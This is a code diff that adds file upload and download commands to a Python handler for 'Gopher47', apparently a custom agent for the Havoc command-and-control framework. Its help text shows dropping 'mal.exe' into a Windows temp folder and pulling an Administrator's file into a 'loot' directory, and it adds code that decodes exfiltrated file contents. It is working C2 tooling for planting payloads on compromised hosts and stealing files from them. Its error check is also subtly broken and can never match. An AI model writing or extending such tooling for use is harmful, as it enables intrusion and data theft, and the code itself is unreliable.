@@ -2,6 +2,7 @@ from havoc.service import HavocService
 from havoc.agent import *
 from os.path import join
 from os import system
+from base64 import b64decode, b64encode
 import re
 
 # ====================
@@ -64,6 +65,56 @@ class CommandLs(Command):
         Task.add_data("ls " + arguments['directory'])
         return Task.buffer
 
+class CommandUpload(Command):
+    Name = "upload"
+    Description = "Upload a file. Specify full path to destination."
+    Help = "Example: upload /opt/mal.exe C:\\Windows\\Temp\\pog.exe"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_file",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="remote_path",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate(self, arguments:dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+        packer.add_data(f"upload {arguments['remote_path']};{arguments['local_file']}")
+        return packer.buffer
+
+class CommandDownload(Command):
+    Name = "download"
+    Description = "Download a file. Please only use full paths."
+    Help = "Example: download C:\\Users\\Administrator\\flag.txt /home/kali/loot/flag.txt"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="remote_path",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="local_file",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate(self, arguments:dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+        packer.add_data(f"download {arguments['remote_path']};{arguments['local_file']}")
+        return packer.buffer    
+
 class CommandExit(Command):
     Name        = "o7"
     Description = "just tells the agent to exit"
@@ -113,6 +164,8 @@ class Gopher47(AgentType):
         CommandShell(),
         CommandKill(),
         CommandLs(),
+        CommandUpload(),
+        CommandDownload(),
         CommandExit()
     ]
 
@@ -224,7 +277,21 @@ class Gopher47(AgentType):
             AgentID = response["Agent"]["NameID"]
             if len(agentjson["data"]) > 0:
                 self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
-        
+        elif agentjson["task"] == "download":
+            AgentID = response["Agent"]["NameID"]
+            if agentjson["data"][0:2] == "[!]":
+                self.console_message(AgentID, "Error", "Received Error: ", agentjson["data"])
+            else:
+                try:
+                    # The JSON is likely escaped, you'll need to fix it
+                    download_info = json.loads(agentjson["data"])
+                    file_name = download_info["filename"]
+                    file_size = str(download_info["size"])
+                    file_content = b64decode(download_info["filedat"]).decode("utf-8")
+                    self.download_file(AgentID, file_name, file_size, file_content)
+                except Exception as e:
+                    self.console_message(AgentID, "Error", "Received Error: ", e)
+            
         return b''
 
 def main():
